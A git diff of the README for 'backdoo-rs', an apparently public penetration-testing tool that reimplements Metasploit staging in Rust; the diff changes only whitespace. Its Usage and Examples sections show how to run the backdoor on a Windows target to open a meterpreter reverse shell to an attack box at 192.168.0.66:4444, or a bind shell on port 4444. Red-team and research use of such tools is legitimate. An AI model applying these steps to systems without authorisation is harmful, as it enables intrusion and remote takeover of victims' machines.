@@ -1,4 +1,5 @@
 # backdoo-rs
+
 [![](https://img.shields.io/github/stars/0xdea/backdoo-rs.svg?style=flat&color=yellow)](https://github.com/0xdea/backdoo-rs)
 [![](https://img.shields.io/github/forks/0xdea/backdoo-rs.svg?style=flat&color=green)](https://github.com/0xdea/backdoo-rs)
 [![](https://img.shields.io/github/watchers/0xdea/backdoo-rs.svg?style=flat&color=red)](https://github.com/0xdea/backdoo-rs)
@@ -9,7 +10,7 @@
 > The end doesn't scare us  
 > When will this cease?  
 > The warheads will all rust in peace"
-> 
+>
 > -- Megadeth, Rust in Peace... Polaris (1990)
 
 Minimalistic Rust implementation of the main staging protocols used by the Metasploit Framework.
@@ -17,7 +18,7 @@ Start an `exploit/multi/handler` instance on the attack box configured to handle
 payloads, run `backdoo-rs.exe` on the target Windows system, and enjoy your session!
 
 Blog post:  
-https://security.humanativaspa.it/learning-rust-for-fun-and-backdoo-rs  
+https://security.humanativaspa.it/learning-rust-for-fun-and-backdoo-rs
 
 See also:  
 https://github.com/0xdea/tactical-exploitation/blob/master/letmein.py  
@@ -25,6 +26,7 @@ https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1
 https://github.com/0xdea/tactical-exploitation/blob/master/letme.go
 
 ## Cross-compiling
+
 ```
 [macOS example]
 $ brew install mingw-w64
@@ -33,12 +35,15 @@ $ cargo build --release --target x86_64-pc-windows-gnu
 ```
 
 ## Usage
+
 ```
 C:\> backdoo-rs.exe [:port | host:port]
 ```
 
 ## Examples
+
 Reverse shell:
+
 ```
 [on the attack box]
 $ msfconsole
@@ -50,8 +55,9 @@ msf > exploit
 [on the target box]
 C:\> backdoo-rs.exe 192.168.0.66:4444
 ```
- 
+
 Bind shell:
+
 ```
 [on the target box]
 C:\> backdoo-rs.exe :4444
@@ -65,8 +71,10 @@ msf > exploit
 ```
 
 ## Supported payloads
+
 * windows/x64/meterpreter/reverse_tcp
 * windows/x64/meterpreter/bind_tcp
 
 ## Tested on
+
 * Microsoft Windows 11
